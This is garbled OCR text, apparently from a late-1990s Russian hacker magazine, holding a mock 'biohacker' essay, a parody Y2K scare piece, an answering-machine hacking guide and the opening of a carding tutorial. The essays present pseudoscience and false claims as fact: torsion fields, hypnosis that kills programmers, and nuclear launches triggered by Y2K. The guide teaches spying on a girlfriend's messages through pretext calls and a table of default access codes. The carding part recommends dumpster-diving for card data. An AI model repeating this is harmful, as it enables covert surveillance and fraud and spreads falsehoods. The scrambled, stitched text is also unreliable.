Но только для каждого нового диффура 
нужно новую схему собирать — это око- 
ло 200 проводочков. И все вручную. Так 
что всем проще работать с убогим циф- 
ровым компьютером. Но и здесь спасе- 
ние нашли, попытались построить алго- 
ритмы, которые походят на обычную био- 
логическую эволюцию. И получилось, что 
такие программы способны обучаться 
очень быстро и эффективно работать. А 
ежели ты туда пихнешь еще и нейроаксе- 
лератор (карта такая специальная, пои- 
щи в магазинах или на рынках), то все в 
1 000 раз быстрее будет. Сейчас боль- 
шинство крупных банков стремительно 
закупает такие биопрограммы и биокар- 
ты. Ведь подобная программа очень быс- 
тро у крутейших брокеров опыт перени- 
мает и начинает зарабатывать очень 
большие деньги. Естественно, стоит это 
дорого и сильно не афишируется. Такая 
технология уже давно превзошла челове- 
ческие возможности в плане прогнозов, и 
ее можно научить чему угодно. Разраба- 
тывалось это все, естественно, для ЫА5А, 



ткань. Ре- 
зультаты исследований 
уже позволяют частично восста- 
навливать части мозга после сильных 
повреждений. Вот попал какой-нибудь 
магнат в аварию — черепно-мозговая 
травма, море крови, ну, словом, зритель- 
ная кора пострадала. Идет он к ученым, 
они ему туды чип электронный вставляют, 
который может частично зрение восста- 
новить. Очень дорогостоящая операция! 
Ты, кстати, если хорошенько дома потре- 
нируешься, то потом сможешь огромные 
бабки заколачивать таким образом. Я 
вот недавно собаку свою так проопери- 
ровал. Собаки же все видят в черно-бе- 
лом изображении. Вот мне ее и стало 
жалко. Я ей череп вскрыл, пару чипов с 
видеокарточки выдрал, ей впаял и глаза 
вырезал, а на их место две телевизион- 
ные трубки 21 -дюймовые вставил. Маме 
вот только не понравилось, ее с сердеч- 
ным приступом увезли, когда она моего 
песика увидела. Но это все ерунда, я вот 
тут узнал, что в ближайшем будущем за- 
вершится работа над вспомогательными 
вживлениями. Можно будет усиливать ма- 
тематические функции мозга, память, 
вживить передающее устройство. Тоже, 
кстати, прибыльное дело! Новым русским 
мобильные в бошки вшивать, себе пару 
терабайтиков памяти, чтоб порнушные 
видеофильмы на касетах не покупать, а 
посмотреть один раз, а потом в мозгах 
крутить, когда в метро едешь, например. 
А пока я с собачкой своей эксперименти- 
ровал, Марк Стидман (крупнейший фи- 
зиолог) с группой лингвистов в Пенсиль- 
вании начал учить компьютер понимать 




тонацию и 
грамматическую часть 
предложения. Так что скоро маши- 
на будет действительно ПОНИМАТЬ, что 
от нее хотят. Это еще один шаг к биоло- 
гическим интерфейсам. 

В Вильнере Институт Глаза разраба- 
тывает системы восстановления зрения. 
Только посмотри на картинку! У первого 
мужика частично повреждена сетчатка - 
не беда! Биоэлектронный механизм рас- 
пределяет на здоровые куски сетчатки ви- 
димое изображение. Второму мужику 
вовсе глаза не нужны. В зрительную кору 
мозга (это, как видишь, на затылке) внед- 
рен массив электродов. А на ботанских 
очках стоимостью 10 000$ закреплены 
цифровые камеры. Третьего мужика ты не 
видишь, это его сетчатка, там такой зеле- 
ненький имплантант, и опять цифровая 
камера на очках. Только тут информация 
поступает не в мозг, а на сетчатку. Все 
удобно и просто, только как такое реали- 



Больше 
всего японцы 
преуспели: их биоэлектронная 
рука может с равной легкостью взять и 
кирпич, и хрупкое яйцо. 

Ты уже заметил, наверное, что оста- 
лось тебе только все эти технологии доде- 
лать и вместе собрать. И получим мы че- 
ловека, мозг которого соединен с ком- 
пьютером, а компьютер — с Интернет. 
Для него компьютерный мир столь же 
реален, как и физический. 

Все бы хорошо, да моралисты не пус- 
кают. У их брата хватка железная: «Жи- 
вотных не мучайте! Компьютер и так для 
здоровья вреден, а тут еще вдруг кто 
биоэлетронные мозги вирусом заразить 
вздумает! Нееее, мы того не хотим! Мы 
того не допустим». Дошло даже до того, 
что все хваленые американские, герман- 
ские и др. ученые ежегодно перед зеле- 
ными отчитываются. Мол, не больно 
обезьянкам от наших исследований. Гля- 
дите: они сами в нашу машину залезают. 
Другое дело Россия, есть нечего, какое 
нам дело до каких-то обезьян? Тут и на 
людях можно поэкспериментировать.... 



нетики». Го- 
ряев и пред- 
шественники выяснили, что ДНК является 
своеобразным генератором особых по- 
лей. Таким образом, живые клетки спо- 
собны общаться даже через кварцевое 
стекло. А электронные аппараты, способ- 
ные своим излучением дистанционно 
влиять на гены человека и животных, уже 
построены. Более того, они окружают 
нас. По мнению Горяева все возрастаю- 
щее количество генных мутаций связано с 
наводнением нашей жизни электроволна- 
ми. Наибольший вред приносят сотовые 
телефоны, микроволновые печи - наибо- 
лее мощные излучатели. Но самое инте- 
ресное, что тебе будет очень просто соз- 
дать аппарат, который, следуя програм- 
ме, влиял бы на гены человека. Если неч- 
то подобное смог создать китаец в 57- 
ом, то в наше-то электронное время! По 
сравнению с волновой генетикой совре- 
менная — просто детские игрушки. Но 
все мы, конечно, думаем, что такого ап- 
парата у спецслужб нет, и вообще такое 
невозможно.... 

Нѳ шути с нанотехнологиями! 




зовать смогли? Понятное дело — кроли- 
ков резали, заметьте, живых! Что от 
дохлых-то проку? 



Изучай генетику. ПригодитсяІ 



Электроника это, конечно, хорошо и 
здорово, да только проблем не оберешь- 
ся. Вот поставил ты соседу в мозг чип ма- 
тематический, а он взял и пе- 
регорел. Он 



Основа современного компьютера - 
полупроводник — штука дорогая громоз- 
дкая, и жрет кучу электричества. Так что 
сейчас создают новую элементную базу - 
молекулярную. Компьютеры нового поко- 
ления ты не рассмотришь глазом. Про- 
цессор из нескольких молекул перегонит 
суперкомпьютеры, ведь он сделан на- 
подобие живой клетки. 

Нанонаука 



началась 
с туннельно- 
го микроско- 
па. Ученые 
получили воз- " 
можность со- 
бирать моле- 
кулы по ато- 
мам. 

Доктор Ван Дер Вэйд научился изу- 
чать поведение «искусственных молекул». 
Несколько месяцев назад он открыто 
рассказал о перспективах в этой облас- 
ти. Миллионы запрограммированных на- 
нороботов способны провести любую по 
сложности хирургическую операцию. 
Ввести их своим пациентам ты сможешь 
обычным шприцом. Представляешь, как 
это упростит всю твою работу?! 
Биопроцессор будет деше- 
вым и невероятно ум- 
ным, а главное — 
маленьким. 



Ну и Израиль, 
конечно, не отстал, там 
выяснили, что сигналы по нейронам идут 
по принципу радиоприемника. Ты, навер- 
но, знаешь, что каждая часть мозга отве- 
чает за свое. Зрительная кора - зрение, 
слуховая — слух и т.п. Есть и нервы спе- 
циальные: зрительный, слуховой.... Но ес- 
ть и другой способ связи глаза с мозгом, 
например. Оказывается, что каждый 
участок мозга имеет свою волну, ну прям 
как радиостанции. Это значит, что те- 
перь, чтобы к зрительной коре подклю- 
читься, мне не надо туда или в сетчатку 
электроды совать. Теперь я могу подклю- 
читься к любому нерву, настроиться на 
волну нужного мне участка мозга и пере- 
давать или получать информацию. Это 
раскрывает невероятные возможности 
для техники. Представь обычные наушни- 
ки, использующие этот принцип: они и 
зрительные галлюцинации у тебя вызовут, 
и холод, и голод, и запах, словом, полная 
реальность. И нечего особенного не на- 
до, запустил программу, и все. От этих 
исследований, кстати, пострадали крысы. 
Поэтому они теперь плееров боятся 
очень. 

Хирурги, конечно же, тоже рады были 
«Если глаз можно заменить электронным, 
почему бы руки и ноги такими не сде- 
лать?». И стали они делать нейроуправ- 
ляемые протезы. Процессор к нервам 
подключен, желание человека улавли- 
вает и механической частью управляет. 



опять к 

тебе припрется череп 
вскрывать, мозги потрошить, да 
еще и пол-литра с собой захватит, а тебе 
другими делами надо заниматься. А по 
пьяни можно и батарейки случайно ему 
не туда вшить. Вот генетики и думают, что 
круто было бы вывести зверушку такую, 
она тебе сама в мозг заползет, сама под- 
ключится, никаких батареек. И, знай, си- 
дят себе в своих лабораториях и все ДНК 
читают, белки разворачивают, картинки 
дурацкие рисуют. Мол, все человеческие 
гены прочтем и тогда.... А что тогда? 

Но это все на западе, а у нас-то тут та- 
кое творится! Еще в далеком 1957 году 
китайский исследователь Дзян-Каньджен 
построил ряд интересных приборов. Так 
появились на свет животные и растения- 
химеры, такие, как куро-утки, цыплята с 
волосами самого Дзян-Каньдженя, кроли- 
ки с рогами козы, кукуруза, из початков 
которой росли пшеничные колосья, и т.д. 
Его исследования были продолжены рос- 
сийскими учеными. А сегодня этим зани- 
мается Горяев в институте Квантовой ге- 
нетики при РАН. Хороший мужик, кстати. 
Вот когда время найду на то, чтобы у му- 
равьев хвосты от павлинов выращивать, к 
нему пойду подучиться. А сейчас я очень 
заинтересовался теорией «волновой ге- 



Э' 





Соединить же 
его с живой тканью будет просто и без- 
болезненно. 

Дело только в усовершенствовании 
самих нанотехнологий. Сейчас для иссле- 
дования «искусственной молекулы» уче- 
ные используют генераторы 400 ГигаГерц 
— просто фантастические частоты. Это 
тебе не 1 66 МегаГерц, как на твоем ла- 
бораторном Пентиуме. 

А еще, если на тебя бандиты наедут, 
чтоб ты с ними делился, ты сможешь отку- 
питься от них выполнением нескольких за- 
казов. С помощью нанороботов смо- 
жешь убивать или подчинять людей. Их 
ведь невозможно будет уловить или убить 
наподобие болезни. 

Зачем гипнотизеры спецслужбам и что 
такое торсион? 

Ты разрабатываешь биокомпьютер, а 
КГБшники смеются над тобой. Ведь самый 
обычный гипноз способен буквально 
программировать обычных людей. Посы- 
лают, к примеру, шпиона с шифровкой, 
іушенной под гипнозом. Программа та- 
кова, что он вспомнит сообщение, только 
когда найдет адресата. Лови его, на кус- 
ки режь, он, даже если сам захочет, рас- 
сказать не сможет. Удобно? 

Гипноз изучен и построены приборы. 



которые могут гипнотизировать. Первые 
разработки были сделаны в гитлеровской 
Германии, вмести с ракетами и ядерным 
оружием. А через десяток лет после вой- 
ны появились мирные варианты 
ВІОРЕЕТВАСК'и, которые до сих пор 
очень популярны у моих американских 
коллег, они позволяют лечить импотен- 
цию и т.п. Но нам-то с тобой пока рано 
об этом думать. А вот гипноз в Интернете 
нам пригодится. 

Был большой скандал на сервере 
добровольных пожертвований в Интерне- 
те. Выяснилось, что Заѵа апплеты гипноти- 
зировали пользователей, и те «добро- 
вольно» вносили деньги. Все, конечно же, 
слышали про таинственные смерти прог- 
раммистов от остановки сердца. Это 
объяснимо, ведь под гипнозом можно 
приказать человеку остановить сердце. В 
данном случае тебе надо будет вставлять 
гипнокартинку в роковой 26-й кадр. А не- 
давно мне пришло письмо, в котором го- 
ворилось, что некоторые плагины 
ѴѴіпАтр'а (МРЗ плеера) вызывают голов- 
ную боль и плохое самочувствие, если ты 
на него смотришь более 2-х часов. Ну, 
про эти плагины я уже знал, их мои прия- 
тели в Штатах делали. Они тоже любят 
поиздеваться над юзерами. 

Правда, гипнокомпьютер не очень 
удобен. Можно, конечно, управлять 
простыми смертными через телевизор, 



радиоприемник и т.п. Но нужно, чтобы 
человек что-то слушал или смотрел. Вот 
один мой приятель и изобрел аппарат, 
который способен влиять на мозг на 
большом расстоянии. Такие аппараты ге- 
нерируют ТОРСИОННЫЕ поля. Изуче- 
нием торсиона занимался еще сам Нико- 
ла Тесла, читай его дневники. А множес- 
тво патентов на эту тему успешно скры- 
ваются от глаз смертных. Дело в том, что 
простейший такой аппарат ты сможешь 
собрать дома на столе. А что было бы, 
если бы не только мы с тобой стали их де- 
лать? 

Век биокомльютѳра. 

Живи спокойно, радуйся жизни. Ско- 
ро ты услышишь о биокомпьютерах боль- 
ше. Они уже манят многих восхитительны- 
ми возможностями. А когда очнешься 
внутри машины или станешь свидетелем 
странных вещей — смирись. От сумы и от 
тюрьмы не зарекайся. Хотя, от первой те- 
бе поможет всякая халтурка с имплантан- 
тами, а вот от второй тебе точно не уйти. 
Ну, если только тебя не привезут погос- 
тить к нам в палату. И ничего смешного, 
между прочим. Общество не понимает 
нас, гениев. 

Главный биохакер, 

Гена КроКоДИЛов 



Ехуд Ахиссар (ЕЬцсі АЬіззаг) 
(972-8) 934-3748, Рах: 
[У /2-8) 934-4140, 
е-таіі: ЬпеНцб@ѵлсстаіІ.ѵѵеІ 2 - 
тапп.ас.іі 

Израильский исследователь. 
Вейзманский институт наукТНе 
ѴѴеігтапп Іпзііііііе о( 5сіепсе 
(Израиль). Нейромеханизмы, 
лежащие в основе адаптивной 
обработки. Рт подобные 
механизмы в нейронах. 



Теодор В. Бергер. (Вегдег, ТЬеосІоге \У.) Ьегдег@Ьт5Г5.ц5с.ебц 

Профессор факультета Биомедицинской Инженерии Гарвардского Университета с 1976 года. 

Анатомия, физиология мозга. Память и математическое моделирование мыслительных процессов. Разработка 
внутримозговых внедрений (имплантантов) на кремниевой основе. 

Никола Тесла (Ыікоіа Тезіа) 1856-1943. Хорватский 
эмигрант в США. Выдающийся физик, открыл 
трансформатор, катушку Тесла. Его архив практически не 
сохранился (говорят, что не сохранился). Но из доступных 
дневников ученого очевидно, что он является 
первооткрывателем торсионных полей. На этом принципе 
им была построена машина, которая ездила от 
генератора на башне БЕЗ ПРОВОДОВ. Этот факт 
невозможно скрыть, т.к. он демонстрировал эту машину 
на ярмарках и выставках. Чертежи и пр. исчезли вместе с 
архивом и самим аппаратом. 



Профессор Даниил В. ван дер Вайд. (РапіеІ ѴѴ. ѵап Зег ѴѴеісІе) 
РЬоле: (302) 83 1 -8784, Рах: (302) 83 1 -43 1 6 ог (302) 831-1218, 
е-таіГ. 6ап@ее.цсІеІ.есіц 

Профессор кафедры Электронной Инженерии в Университете 
штата Делавэр (США). Исследование искусственной 
молекулы. Создание новой биоподобной базы для 
компьютеров на основе нанотехнологий. 



Доктор Джон Трусвел роЬп Тгце$ѵ/еІІ) 

ОН\се РНопе: (215) 898-0911 
ЬаЬ РНопе: (215)573-2841 
е-таіі: 1те5ѵѵеІ@р5усН.црепп.есІіі 
Институт естественных наук при 
университете в Пенсильвании. 
Лаборатория по исследованию 
человеческого языка, мимики, 
способов общения. 



Петр П. Гаряев. 123056 Москва, Мало-Тишинский пер.1 1 /12-25. Тел/Факс: (095) 253- 
1705 Российская Академия Наук. Институт Квантовой Генетики. В данный момент 
возглавляет неформальное общество (ЕГЭ) «Биофон», исследующее генетику, физику и 
аномалии. 



Ричард А. Норманн 
(РісЬагб А. Ыогтапп) 
погтапп@т.сс.ц1аЬ.ес1ц 
Профессор кафедры 
биоинженерии Ііпіѵегзііу 
о{ СІіаЬ (США). 
Кортикальные (кора 
головного мозга) 

имплантанты, частичное 
восстановление зрения. 





шт 40НВЯННН 





Интересные слушки стали распрос- 
траняться по нашей редакции, друзья 
мои. Явился тут к нам один с придуркова- 
той физиономией и заявил, что скоро 
должен наступить 2000 год! Да к тому же 
не просто наступить, а ознаменовать 
свой приход салютом их атомных ракет, 
массовым психозом компьютеров и пол- 
ным помешательством их пользователей. 
Ну, и придумают же! Ну, нас-то так прос- 
то на такие понты не возьмешь, мы-то 
знаем, что депутаты никогда не примут 
закон о наступлении 2000 года. А ком- 
пьютеры... ну да, верно, компьютеры ни- 
чего о наступлении 2000 года не знают. 
Но их тоже можно понять, ведь они же 
неграмотные, Билл Гей-тссс скрывает это 
от них в глубочайшем секрете, в школе 
им про это не рассказывали, в институте 
и подавно, там только студенты их пивом 
поливают, да всякие шибко умные прог- 
раммеры на них вирусы тестируют. Когда 
же тут о У2К думать, в такой нервной об- 
становке? 



УЖ: Ш5Т ВІЕ ИЛИ НЕТ? 



Итак, в чем же заключается суть 
проблемы У2К — именно так, с содрога- 
нием, переходящим в ужас, называют 
знаменательную дату в мировой элек- 
тронно-вычислительной прессе? Трагедия 
состоит в том, что львиная доля мирового 
парка ЭВМ создавалась еще в те време- 
на, когда даже такой оптимист, как Папа 
Римский, не верил и не предполагал, что 
это абсурдное сборище дешевых тай- 
ваньских деталей под названием РС смо- 
жет дожить хотя бы до окончания гаран- 
тийного срока. Про У2К же даже и речи 
не шло. Но мир подвело умение бедного 
и жадного пользователя выжимать из 
компьютера все ресурсы, а именно: раз- 
гонять І286-16 до состояния 
іРІІ-666 путем замыкания 
двух конденсаторов в 
спертой из палеонтоло- 
гического музея 
муль- 



тикарте. Эти компьютеры работают себе, 
боопл-ают, играют с вами в шахматы, от- 
сылают ваш е-таіі к черту на кулички и 
даже не задумываются о том, что остался 
всего год до того момента, как счетчик 
лет в их таймере с грохотом перевалит с 
99 на... А вот то, на что он перещелкнет- 
ся, и знаменует весь страх и ужас совре- 
менного кибернетического сообщества. 

Опасность намбер раз 

Подавляющее большинство совре- 
менных программных продуктов (см. ма- 
нуалы) не рассчитаны на распознавание 
первых двух цифр текущего года. Год 



а не ѴѴіпсІоѵѵз 1998, а, значит, счетчик 
первых двух цифр года в нее так и не был 
включен. 

Теперь наступил момент для мыслен- 
ного опыта: представьте, что на коммер- 
ческом порнографическом сайте, кото- 
рый вы, вместе с вашими родителями, 
разместили в Интернете, происходит ав- 
томатическое обновление информации 
на более свежую. Для автоматизирован- 
ной системы это норма, когда сервер за- 
меняет устаревшие картинки, послания и 
данные на новые, потихоньку уничтожая 
старые. Как только наступает год «00», 
сервер, сравнивая файлы с этой датой, 
естественно, решит, что данные за «97», 
«98» и «99» новее — еще бы, ведь эти 
цифры намного больше. В результате 
все, поступающее в 2000-ом году, будет 
автоматически уничтожаться, и даже по- 
жухлые черно-белые порнокартинки 
1932 года, отснятые допотопной «Сме- 
ной 8М», будут выдаваться за эксклюзив- 
ную свежатинку. Количество клиентов 
платного сайта катастрофически падает, 
разочарованная публика требует вер- 
нуть обратно деньги за билеты, и через 
полгода вы и ваши родители оказывае- 
тесь по уши в долгах, и, как результат — 
остаток вашей жизни вы проводите в дол- 
говой тюрьме. 

По этой же причине редакция X ре- 
комендует уничтожить все ваши игры с 
автоматическим сохранением и загруз- 
кой незадолго до нового 2000 года. Ибо 
по прошествии этой планки игра не смо- 
жет правильно определить, какой сохра- 
ненный файл более старый, а какой - но- 
вее, и в результате вы будете обречены 
при каждом запуске играть снова в том 
месте, где остановились в прошлом го- 
ду... Если вообще ваш компьютер еще бу- 
дет в состоянии играть, но об этом в 
опасности намбер два. 



Опасность намбер два 

Любой, даже упавший с Луны без па- 
рашюта человек, знакомый с теорией 
компьютерных игр, прекрасно 
знает, что в основе их функцио- 
нирования лежат так 
на- 



... даже такой оп- 
тимист, как Папа 
Римский, не верил 
и не предполагал, 
что это абсурдное 
сборище дешевых 
тайваньских дета- 
лей под названием 
РС сможет дожить 
хотя бы до окон- 
чания гарантийно- 
го срока. 



рождения В.И.Ленина (1870) и выход пос- 
леднего альбома ТЬе Веаііез (1970) для 
них одно и то же, вне зависимости от то- 
го, чьи песни (Ленина или Леннона) им 
нравятся больше. Наглядный пример — 
ѴѴіпсІоѵѵз 95, даже в названии которого 
фирма МісгозоЙ не предусмотрела до- 
полнительных цифр. Когда Билли, анонси- 
руя ѴѴіпсІоѵѵз 98, уверял, что эта опера- 
ционная система уже подготовлена к 
проблеме Ѵ2К, эксперты только рассмея- 
лись — еще бы, ведь систе- 
ма стала зваться имен- 
но ѴѴіпсІоѵѵз 98, 






Шикель ГРУБЫЙ 



аываемые «датчики случайных чисел». Бе- 
готня монстров, перетасовка колоды 
карт, направление атаки Протоссов или 
количество хитов, выбиваемых из вашего 
кровного врага в ролевой игре - все эти 
события находятся в прямой зависимости 
от набора случайных чисел, дабы они бы- 
ли как можно более непредсказуемыми, 
а, значит, возбуждающими. Весь смех и 
хохот заключается в том, что подавляю- 
щее число генераторов случайных чисел 
основано на подсчете цифр, исходя из 
показаний компьютерного таймера. Фун- 
кции перемножения часов, секунд и лет 
присутствуют практически везде... Но 
когда номер года становится «00», то и 
любые операции с умножением окажут- 
ся нулевыми. А, значит, все ваши игруш- 
ки во всех ситуациях начнут выдавать 
действия, обусловленные числом «0». 

Чем это грозит? Ваши монстры в Оіюке 
будут стоять на месте! АІ в любой, даже 
самой совершенной РТ5 не сможет 
сдвинуть свои войска или произвести 
какой-либо внезапный выстрел. 

«Марьяж» и «Пасьянс» будет раздавать 
^ам одну и ту же карту. А случайный де- 
монстратор разных «баннеров» в Ин- 
тернете автоматически зациклится и 
начнет показывать одну и ту же застав- 
ку; и молите Бога, чтобы это был бан- 
нер вашего сайта, а не тысяч конкурен- 
тов. 



Опасность нам&ер три 



Вам немедленно следует избавиться 
от всех демо, зЬагеѵѵаге и прочих рек- 
ламных и бесплатных программных про- 
дуктов. Подавляющее большинство из 
них ориентировано на то, что, спустя 
какое-то время (например, после года 
работы), они самоликвидируются, нас- 
тойчиво требуя купить официальную и 
полную версию продукта. Что произой- 
дет с такими программами на рубеже ты- 
сячелетий — и подумать страшно. Неожи- 
данно программы обнаружат, что на ка- 
лендаре установлено время, даже мень- 
ше, чем то, когда они были написаны, 
зк будто кто-то приклеил «Моментом» к 
отрывному календарю несуществующие 
виртуальные листки. Для любой мало- 
мальски умной программы это означает 
лишь одно: «пользователь — жулик, и ме- 
тодом подделки времени пытается меня 
одурачить, гад такой!». А защита от таких 
посягательств встроена повсеместно - 
«возмущенная» вашим обманом прог- 
рамма может самоликвидироваться, по- 
зпример, отформатировав вин- 
эй мести. 



шит конфликт с зациклившейся провер- 
кой ошибки. Не справившаяся с зацик- 
ленной самопроверкой система обрече- 
на на выкидывание из окна. Эффект тако- 
го «Кольца Мебиуса» при входе в 2000 
год — один из самых фатальных. 

В другом случае ЭВМ может войти в 
режим «зіеер», ибо слишком сильный раз- 
рыв во времени может заставить срабо- 
тать системы, настроенные, например, на 
«сон после часа бездеятельности». А тут 
ведь речь даже не о часе, а о какой-то 
непонятной вечности. Такой «сон» дей- 
ствительно может оказаться вечным. 

Так что отключение всех функций 
«Роѵ/ег тапдеплепі» в вашем ВЮ5- 
зеііір и в параметрах системы катего- 
рически рекомендовано лучшими ком- 
пьютероводами. 

Но самую большую опасность для че- 
ловечества таят военные компьютеры. 
Пентагон и Российское Министерства 
Обороны неоднократно получали 
просьбы от программистов-наблюдате- 
лей ООН пройти проверку на ошибку 
У2К, но ООН было отказано с форму- 
лировкой «недопустимости вмешатель- 
ства в хранилища стратегической ин- 
формации». А ведь если компьютеры 
военных министерств войдут в описан- 
ный выше «спящий» режим, то вся сис- 
тема безопасности России или США 
окажется беспомощной перед лицом 
агрессии со стороны не компьютеризи- 
рованных стран (Ирак, Монголия, Гва- 
темала). А в случае глобального зави- 
сания всех военных систем централь- 
ные серверы автоматически среаги- 
руют на это, как на диверсию извне, и 
дадут команду об ответном ударе, на- 
верняка очень даже ядерном. 



Заключение 



Автор этой статьи искренне надеется, 
что разум восторжествует, и человечес- 
тво с честью выйдет из той опасной си- 
туации, которую создало само своей 
непредусмотрительностью. Редакция X 
также ставит своей целью обезопасить 
своих читателей не только вышеизложен- 
ными инструкциями, но и действиями — на 
нашем сайте скоро можно будет скачать 
небольшой (140 ОЬ для РС и 360 СЬ для 
Мае) файлик, превращающий ваш до- 
машний компьютер в цитадель борьбы с 
двухтысячным годом! 



Продолжение темы смотрите на стр. 97. 



Опасность намбер четыре 

Что мы все о программах, да о прог- 
раммах? Чувствительно ли железо к испы- 
танию временем? Да. Хотя большинство 
современных ВЮ5 оперирует четырехци- 
ферным кодом года, это ничуть не озна- 
чает, что периферия (видеокарты, винчес- 
теры и мыши) или даже ядро (процессор, 
материнская плата, кулер и т.п.) считы- 
вают дополнительные разряды с сигналов 
точного времени, регулярно передавае- 
мых им из ВІОЗ. Логика «железа» — это 



шш. — “ — "" 

логика, сравнимая с военной. После 
23:59 31.12.99 должно быть 0:00 
01.01.1 00. Но вместо этого шина данных 
подает сигнал о наступлении 0:00 
01 .01 .00. Реакция железа может быть са- 
мой непредсказуемой. Оперативная па- 
мять воспримет это как ошибку и скажет 
процессору, что он придурок. А процес- 
сор ответит, что все-таки должно быть 00, 
но память (в которой стоит проверка 
ошибок) опять потребует от процессора 
правильного результата (100), и это мо- 
жет затянуться вплоть до следующего ты- 
сячелетия. В лучшем случае ваш компью- 
тер просто повиснет (придется нажать 
ОгІ+АІі+Резеі или открыть СЭ-РОМ 
драйвер и сказать туда фамилию). Но не 
факт, что это разре- 





Если ты не совсем уверен в том, что твоя 
подружка тебе верна, то для этого не нужно 
стоять под ее дверью с топором, яростно обе- 
регая вашу любовь. Я, конечно, понимаю, что 
Варкрафт хоть уже и устарел, но все еще те- 
чет в твоих жилах, и порубать на винегрет лю- 
бого придурка, вторгающегося в твою личную 
жизнь — давняя мечта. Но... Братишка, погоди 
пускать пар из ушей, может быть, твоя подруга 
и не виновата. В любом случае твоим подозре- 
ниям нужны явные доказательства. Иначе ты 
будешь выглядеть полным дураком, и в следую- 
щий раз она будет отмазываться, заявляя те- 
бе, что ты слишком ревнив и ревнуешь безо 
всякого повода. 

Итак, начнем нашу шпионскую деятель- 
ность с телефонии. Для начала проверим ее 
автоответчик. Дело в том, что большинство на- 
ших людей как были, так и остались «совками». 
И к импортной технике они относятся как к хит- 
роумным предметам, изучая только основные 
функции. У меня есть приятель в магазине, тор- 
гующем техникой, и вот он мне рассказывал, 
как у них новый русский покупал компьютер. 
Купил, отвез домой, а на следующий день 
приехал и говорит: «Ни хрена не понимаю. 

Как с ним обращаться-то? Есть какая-нибудь 
инструкция?». Мой друг ему отвечает: «Вам 
книжку нужно купить. Что-нибудь типа «РС для 
чайников». Тот как закипит: «Ты кого чайником 
назвал? Ты чё, в натуре! Не надо мне никаких 
книжек! Книжки пусть Пушкин читает. Ты мне 
объясни, на какую пимпу давить!» : ) Вот так-то, 
приятель. Но вернемся к нашим баранам. 

Итак, если у твоей подружки телефон с 
автоответчиком, то велика вероятность, что ты 
его сможешь взломать. У всех автоответчиков 
есть дистанционное управление с другого те- 
лефона. Для этого нужно только позвонить на 
автоответчик, перейти в тональный режим, и 
как только закончится приветствие, ввести код 
доступа, после этого автоответчик прокрутит в 
трубку все записанные сообщения. Круто? Вот 
этим-то мы и воспользуемся. Если родители 
твоей подруги не особо утруждали себя чте- 
нием инструкции и не устанавливали свой код 



Модель автоответчика: 


Код по 


Рапзопіс 1000 


369 


ОепегаІ Еіесігіс 


хххххх 


Рапазопіс ТМ80ДМ81 


888 




доступа, то считай, что ты уже победил. У всех 
автоответчиков есть «вшитый», фабричный код, 
который стоит по умолчанию. Если хозяин ав- 
тоответчика код не менял, то установлен имен- 
но этот, фабричный код. Теперь тебе нужно уз- 
нать, какой тип автоответчика ты собираешься 
ломать. Это проще пареной репы. Сыграй на 
гордости его хозяина. Позвони своей подруге, 
и когда она поднимет трубку, скажи: «Привет, 
Марфуша. Я тебе сегодня уже звонил днем, 
автоответчик сработал, но пошла какая-то 
хрень, и он меня не захотел записывать. Что 
это у тебя за машинка-то? Советская, что ли?» 
Будь уверен, в ответ ты услышишь что-то типа: 
«Да ты что, офигел? Да у меня Панасоник! 
Последняя модель!» Что нам и было нужно. : ) 
Теперь осталось только узнать модель, и мож- 
но начинать хакать. Продолжаем разговор: 
«Панасоник? А модель какая? Древняя какая- 

умолчанию: Нужная инфа: 



то, небось, раз так глючит». И тебе в негодо- 
вании скажут, какая модель, а если не скажут, 
то ты подскажешь, что номер модели всегда 
написан сзади. : ) Отлично, вся информация у 
тебя есть, теперь переводим взгляд на таблич- 
ку, в которой долгожданные коды доступа. 

Ну, конечно, конечно, я не стал сюда впи- 
сывать все существующие модели. Но я тебе 
кое-что подскажу. Если тебе назвали какую-то 
модель, которой нет в этой таблице - не отчаи- 
вайся. Беги в ближайший магазин, торгующий 
телефонами, найди там эту модель и попроси 
почитать инструкцию. Про код обычно пишут в 
рубрике «$еПіпд гетоіе собе». Там будет вся- 
кая пурга, как его установить, а мелкими бук- 
вами написано, какой код стоит по умолча- 
нию. Теперь дело за тобой. Счастливого ха- 
кинга! 

Сергей ПОКРОВСКІ 



Кассетный автоответчик-приствка. 

Код написан на нижней крышке и не меняется! Вот удача то! 
Шестизначный код, написанный на нижней крышке. Забудь об этом. : ( 
Цифровой автоответчик-приставка. Код вшит в память. 



Рапазопіс 2395 



С автоответчиком - Код написан на нижней крышке и состоит из 
ОДНОЙ цифры!!! (Создатель этой модели - наш человек) Тебе нужно 
максимум 1 0 раз на него позвонить. 



Рапазопіс 2721 и 2470 1 1 1 

Все радиотелефоны Рапазопіс, 00 или 99 



Телефоны с двух кассетными автоответчиками. Код вшит в память. 

Радиотелефоны от Рапазопіс бывают 2-х типов: 46-49 МНг и 900 МНг. 
Здесь придётся повозиться, чтобы узнать, в какой из них ты собираешь 
ся вероломно вломиться. Но я надеюсь ты найдёшь подход к 'клиенту* и 
он тебе это расскажет. 



Ю (бывший Ѳоіс! 5іаг) 



Четырёхзначный код вшит в память. Инструкция даже на русском нас 
только коряво написана, то скорее всего код не меняли. 





Кардинг... Как много в этом слове для сер- 
дца русского слилось. Как много в нем отоз- 
валось! Да, да, да, друзья мои. Именно кар- 
дингом мы сегодня и займемся. Всем извес- 
тно, что Россия не особо блещет популяр- 
ностью юзанья кредитных карточек, а по- 
пользоваться ими хочется, а порой это прос- 
то необходимо! Ну, признайся, ведь хочется 
иногда заглянуть на порносервер, да не 
краем глазика, а широко раскрыв свои гла- 
зищи (чтоб, ни дай Бог, чего-нибудь не про- 
пустить), да еще и качнуть оттуда на свой 
винчестер мегабайта эдак на два. Да не 
вопрос! 

Для начала давай-ка разберемся, что такое 
«кардинг». В общем, это — незаконное ис- 
пользование кредитных карточек для покуп- 
ки товаров или услуг. Вот так все просто. 
Эта отрасль хакерского ремесла очень по- 
лезна, особенно для тех из вас, кто сидит 
без работы, без стипендии и т.д. Занимаясь 
кардингом, можно либо получить информа- 



цию о реальной карте, либо сгенери 
все эти данные, но так, что все системы бу- 
дут принимать ее за реальную. Я расскажу и 
о первом, и о втором вариантах. Только не 
надо думать, что, прочитав эту статью, ты 
сразу станешь крутым кардером. Конечно, 
эта статья не для профессионала, а для но- 
вичка, который не знает, как получить и ис- 
пользовать кредитную карточку хакерским 
стилем. 

Итак, начнем с реальных карт. Первая вещь, 
которую ты должен сделать, — это получить 
всю информацию о карте. Самый простой 
способ — пойти в местный магазин, который 
использует кредитные карточки. Покрутись 
вокруг магазина и посмотри, куда они выки- 
дывают мусор. Запомни, мусор для мошен- 
ника — одно из главных средств получения 
